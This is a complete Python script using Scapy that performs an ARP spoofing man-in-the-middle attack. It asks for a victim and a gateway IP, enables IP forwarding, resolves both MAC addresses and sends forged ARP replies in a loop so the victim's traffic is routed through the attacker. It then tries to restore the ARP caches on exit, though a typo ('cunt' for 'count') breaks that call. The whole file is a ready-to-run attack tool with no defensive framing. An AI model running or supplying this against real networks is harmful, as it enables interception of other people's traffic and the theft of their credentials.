from scapy.all import *

import sys
import os
import time

def poison(gMAC,vMAC,gIP,vIP):
	send(ARP(op=2,pdst=vIP,psrc=gIP,hwdst=vMAC),verbose=0)
	send(ARP(op=2,pdst=gIP,psrc=vIP,hwdst=gMAC),verbose=0)
def cure(gMAC,vMAC,gIP,vIP):
	send(ARP(op=2,pdst=gIP,psrc=vIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=vMAC),count=5)
	send(ARP(op=2,pdst=vIP,psrc=gIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gMAC),cunt=5)
def attack():
	try:
		print("Poisoning.......")
		while True:
			poison(gatewayMac,victimMac,gatewayIP,victimIP)
			time.sleep(5)
	except KeyboardInterrupt:
		print("Restoring ARP Cache....")
		cure(gatewayMac,victimMac,gatewayIP,victimIP)
		print("Exiting....")
		sys.exit(1)


interface = input("Enter your network interface")
victimIP = input("Enter victim Ip")
gatewayIP = input("Enter gate IP")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

try:
	victimAns,VictimUnans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victimIP),timeout=2,iface=interface,inter=0.1)
	victimMac = victimAns[0][1].hwsrc
	gatewayAns,gatewayUnans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gatewayIP),timeout=2,iface=interface,inter=0.1)
	gatewayMac = gatewayAns[0][1].hwsrc
	print("Gate MAC address Resolved"+gatewayMac)
	print("victim mac address Resolved"+victimMac)
except Exception:
	print("unable to Resolved")
	print("Exiting..")
	sys.exit(1)


attack()